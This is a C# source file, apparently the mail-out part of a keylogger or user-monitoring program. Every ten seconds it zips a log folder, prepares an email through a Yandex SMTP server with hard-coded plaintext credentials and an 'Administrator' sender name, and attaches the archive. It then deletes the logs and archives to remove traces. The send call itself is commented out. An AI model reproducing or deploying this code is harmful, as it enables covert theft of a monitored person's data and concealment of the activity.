using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.AccessControl;
using System.Text;
using System.IO;
using System.Threading;
using Ionic.Zip;
using System.IO.Compression;
using System.Net.Mail;
using System.Windows.Forms;
using System.Timers;
using Timer = System.Timers.Timer;

namespace userControlProgram
{
    class MailSender
    {
        private static string _path;
        private static MailAddress _email;
        public static void MainSenderFunc(string path, MailAddress email)
        {
            _path = path;
            _email = email;

        //    if (Package())
        //        SendPackage();
            Timer timerSender = new Timer(10000);
            timerSender.Start();
            timerSender.Elapsed += OnTimerTick;
        }

        private static bool Package(string zipName)
        {
            try
            {
                using (ZipFile zip = new ZipFile()) // Создаем объект для работы с архивом
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                        // Задаем максимальную степень сжатия 
                    zip.AddDirectory(_path); // Кладем в архив папку вместе с содежимым
                    zip.Save(zipName); // Создаем архив  
                }
            }
            catch
            {
                return false;
            }
            return true;
        }

        private static bool SendPackage(string zipName)
        {
            // send mail
            try
            {
                SmtpClient client = new SmtpClient();
                client.Host = "smtp.yandex.ru";
                client.Credentials = new NetworkCredential("logger.usercontrol@yandex.ru", "1234567890987654321");

                MailMessage mailMessage = new MailMessage();
                mailMessage.From = new MailAddress("logger.usercontrol@yandex.ru", "Administrator");
                mailMessage.Sender = new MailAddress("logger.usercontrol@yandex.ru", "Administrator");
                mailMessage.To.Add(_email);
                mailMessage.Subject = "Log form " + DateTime.Now.DayOfWeek + ", " + DateTime.Now.Month + " " +
                                      DateTime.Now.Day + "; " + DateTime.Now.Hour + " hours.";
                mailMessage.Body = @"";
                mailMessage.IsBodyHtml = false;
                mailMessage.Priority = MailPriority.High;

                Attachment attachment = new Attachment(zipName, System.Net.Mime.MediaTypeNames.Application.Zip);

                mailMessage.Attachments.Add(attachment);

         //       client.Send(mailMessage);
            }
            catch 
            {
                return false;
            }

            // delete package
            
            Thread deleteThread = new Thread(DeleteFun);
            deleteThread.Start(zipName);


            return true;
        }

        private static void OnTimerTick(object o, ElapsedEventArgs e)
        {
            Thread senderTread = new Thread(ManagerThread);
            string zipName = "C:\\Users\\Public\\log_" + DateTime.Now.Day + "d"+ DateTime.Now.Hour + "h" +
                         DateTime.Now.Minute + "m" + ".zip";
            senderTread.Start(zipName);
        }
        private static void ManagerThread(object zipName)
        {
            if (Package(zipName.ToString()))
            {
                SendPackage(zipName.ToString());
            }
        }

        private static void DeleteFun(object zipName)
        {
            try
            {
                DirectoryInfo dir = new DirectoryInfo(_path);
                FileInfo[] files = dir.GetFiles();

                foreach (var fileInfo in files)
                {
                    File.Delete(fileInfo.FullName);
                }

                dir = new DirectoryInfo("C:\\Users\\Public\\");
                files = dir.GetFiles();

                foreach (var fileInfo in files)
                {
                    if (fileInfo.Name.Contains("log_"))
                        File.Delete(fileInfo.FullName);
                }
            }
            catch
            {
            }
        }
    }
}
